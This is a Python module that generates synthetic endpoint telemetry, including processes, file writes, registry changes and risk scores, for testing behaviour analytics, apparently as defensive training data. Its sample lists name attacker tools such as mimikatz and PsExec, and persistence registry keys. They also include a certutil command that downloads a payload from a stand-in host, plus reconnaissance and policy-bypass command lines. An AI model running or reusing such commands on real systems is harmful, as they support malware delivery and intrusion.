"""Endpoint telemetry event generator for UEBA synthetic data."""

import datetime
import numpy as np

from simulator.config import ENDPOINT_EVENTS_PER_DEVICE_DAY, WORK_HOURS


PROCESS_CATALOG = {
    "benign": [
        ("chrome.exe", "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"),
        ("msedge.exe", "C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe"),
        ("outlook.exe", "C:\\Program Files\\Microsoft\\Office\\root\\Office16\\OUTLOOK.EXE"),
        ("explorer.exe", "C:\\Windows\\explorer.exe"),
        ("svchost.exe", "C:\\Windows\\System32\\svchost.exe"),
        ("teams.exe", "C:\\Users\\user\\AppData\\Local\\Microsoft\\Teams\\current\\Teams.exe"),
        ("code.exe", "C:\\Users\\user\\AppData\\Local\\Programs\\Microsoft VS Code\\Code.exe"),
        ("python.exe", "C:\\Python311\\python.exe"),
        ("node.exe", "C:\\Program Files\\nodejs\\node.exe"),
        ("git.exe", "C:\\Program Files\\Git\\cmd\\git.exe"),
        ("notepad.exe", "C:\\Windows\\System32\\notepad.exe"),
        ("slack.exe", "C:\\Users\\user\\AppData\\Local\\slack\\slack.exe"),
        ("zoom.exe", "C:\\Users\\user\\AppData\\Roaming\\Zoom\\bin\\Zoom.exe"),
        ("OneDrive.exe", "C:\\Users\\user\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe"),
        ("SearchIndexer.exe", "C:\\Windows\\System32\\SearchIndexer.exe"),
    ],
    "admin_tools": [
        ("powershell.exe", "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"),
        ("cmd.exe", "C:\\Windows\\System32\\cmd.exe"),
        ("mmc.exe", "C:\\Windows\\System32\\mmc.exe"),
        ("regedit.exe", "C:\\Windows\\regedit.exe"),
        ("taskmgr.exe", "C:\\Windows\\System32\\Taskmgr.exe"),
        ("wmic.exe", "C:\\Windows\\System32\\wbem\\WMIC.exe"),
        ("net.exe", "C:\\Windows\\System32\\net.exe"),
        ("sc.exe", "C:\\Windows\\System32\\sc.exe"),
    ],
    "suspicious": [
        ("mimikatz.exe", "C:\\Temp\\mimikatz.exe"),
        ("psexec.exe", "C:\\Temp\\PsExec.exe"),
        ("certutil.exe", "C:\\Windows\\System32\\certutil.exe"),
        ("rundll32.exe", "C:\\Windows\\System32\\rundll32.exe"),
        ("mshta.exe", "C:\\Windows\\System32\\mshta.exe"),
        ("regsvr32.exe", "C:\\Windows\\System32\\regsvr32.exe"),
    ],
}

PARENT_PROCESSES = [
    "explorer.exe", "svchost.exe", "services.exe", "winlogon.exe",
    "cmd.exe", "powershell.exe", "wininit.exe", "csrss.exe",
]

FILE_PATHS = [
    "C:\\Windows\\System32\\config\\system",
    "C:\\Windows\\Temp\\update.tmp",
    "C:\\Users\\user\\Documents\\report.docx",
    "C:\\Users\\user\\AppData\\Local\\Temp\\tmp_file.dat",
    "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\helper.lnk",
    "C:\\Windows\\System32\\drivers\\etc\\hosts",
    "C:\\Users\\user\\Downloads\\attachment.exe",
    "C:\\Program Files\\Common Files\\update.dll",
]

REGISTRY_KEYS = [
    "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
    "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
    "HKLM\\SYSTEM\\CurrentControlSet\\Services",
    "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
    "HKCU\\SOFTWARE\\Classes\\ms-settings\\shell\\open\\command",
    "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender",
]

COMMAND_LINES = [
    "chrome.exe --no-sandbox --disable-gpu",
    "python.exe -m pip install requests",
    "git.exe pull origin main",
    "powershell.exe -ExecutionPolicy Bypass -File script.ps1",
    "cmd.exe /c whoami /all",
    "net.exe user /domain",
    "certutil.exe -urlcache -split -f http://example.com/payload.exe",
    "svchost.exe -k netsvcs -p",
    "code.exe --wait --diff file1.txt file2.txt",
    "outlook.exe /recycle",
]


def _endpoint_timestamp(current_date, rng):
    """Generate timestamp biased toward work hours (75/25 split)."""
    work_start, work_end = WORK_HOURS
    if rng.random() < 0.75:
        hour = rng.integers(work_start, work_end)
    else:
        hour = rng.choice(list(range(0, work_start)) + list(range(work_end, 24)))
    minute = rng.integers(0, 60)
    second = rng.integers(0, 60)
    return datetime.datetime.combine(current_date, datetime.time(int(hour), int(minute), int(second)))


def _pick_event_type(rng):
    """Select event type: process_start 40%, file_write 25%, registry_modify 15%,
    service_change 10%, driver_load 5%, dll_injection 5%."""
    r = rng.random()
    if r < 0.40:
        return "process_start"
    elif r < 0.65:
        return "file_write"
    elif r < 0.80:
        return "registry_modify"
    elif r < 0.90:
        return "service_change"
    elif r < 0.95:
        return "driver_load"
    else:
        return "dll_injection"


def _pick_process(event_type, rng):
    """Select process name and path with risk-appropriate distribution."""
    r = rng.random()
    if r < 0.85:
        category = "benign"
    elif r < 0.97:
        category = "admin_tools"
    else:
        category = "suspicious"

    proc_list = PROCESS_CATALOG[category]
    idx = rng.integers(0, len(proc_list))
    return proc_list[idx][0], proc_list[idx][1], category


def _compute_risk_score(category, event_type, rng):
    """Compute risk score: mostly benign (0-20), occasional medium (20-50), rare high (50-100)."""
    if category == "benign":
        base = rng.integers(0, 15)
    elif category == "admin_tools":
        base = rng.integers(10, 40)
    else:
        base = rng.integers(40, 85)

    # Certain event types add risk
    if event_type in ("dll_injection", "driver_load"):
        base += rng.integers(10, 30)
    elif event_type == "registry_modify":
        base += rng.integers(5, 15)

    return min(int(base), 100)


def _generate_hash(rng):
    """Generate a fake SHA-256 process hash."""
    return "".join(f"{rng.integers(0, 256):02x}" for _ in range(32))


def generate_endpoint_events(devices_df, users_df, user_profiles, current_date, rng) -> list[dict]:
    """Generate endpoint telemetry events for all devices on a given date.

    Args:
        devices_df: DataFrame with columns [device_id, device_type, ip_address, segment_id]
        users_df: DataFrame with columns [user_id, primary_device_id]
        user_profiles: dict mapping user_id to per-user behavioral profile
        current_date: date object for event generation
        rng: numpy random Generator for reproducibility

    Returns:
        List of endpoint event dicts.
    """
    events = []

    # Build device -> user mapping
    device_to_user = {}
    for _, user in users_df.iterrows():
        device_to_user[user["primary_device_id"]] = user["user_id"]

    for _, device in devices_df.iterrows():
        # Only endpoints and servers generate endpoint telemetry
        if device["device_type"] not in ("endpoint", "server"):
            continue

        n_events = rng.poisson(ENDPOINT_EVENTS_PER_DEVICE_DAY)
        device_id = device["device_id"]
        user_id = device_to_user.get(device_id, "SYSTEM")

        # Per-user admin tool rates
        profile = user_profiles.get(user_id, {}) if user_profiles else {}
        admin_pct = profile.get("admin_tool_pct", 0.12)
        suspicious_pct = 0.03  # keep suspicious constant
        benign_pct = 1.0 - admin_pct - suspicious_pct

        for _ in range(n_events):
            ts = _endpoint_timestamp(current_date, rng)
            event_type = _pick_event_type(rng)

            # Inline category selection using per-user rates
            r = rng.random()
            if r < benign_pct:
                category = "benign"
            elif r < benign_pct + admin_pct:
                category = "admin_tools"
            else:
                category = "suspicious"
            proc_list = PROCESS_CATALOG[category]
            idx = rng.integers(0, len(proc_list))
            process_name, process_path = proc_list[idx][0], proc_list[idx][1]

            process_hash = _generate_hash(rng)
            parent_process = rng.choice(PARENT_PROCESSES)
            risk_score = _compute_risk_score(category, event_type, rng)

            file_path = None
            command_line = None

            if event_type in ("file_write", "registry_modify"):
                file_path = rng.choice(FILE_PATHS if event_type == "file_write" else REGISTRY_KEYS)
            if event_type == "process_start":
                command_line = rng.choice(COMMAND_LINES)

            events.append({
                "timestamp": ts,
                "device_id": device_id,
                "user_id": user_id,
                "event_type": event_type,
                "process_name": process_name,
                "process_hash": process_hash,
                "parent_process": parent_process,
                "process_category": category,
                "file_path": file_path,
                "command_line": command_line,
                "risk_score": risk_score,
            })

    events.sort(key=lambda e: e["timestamp"])
    return events
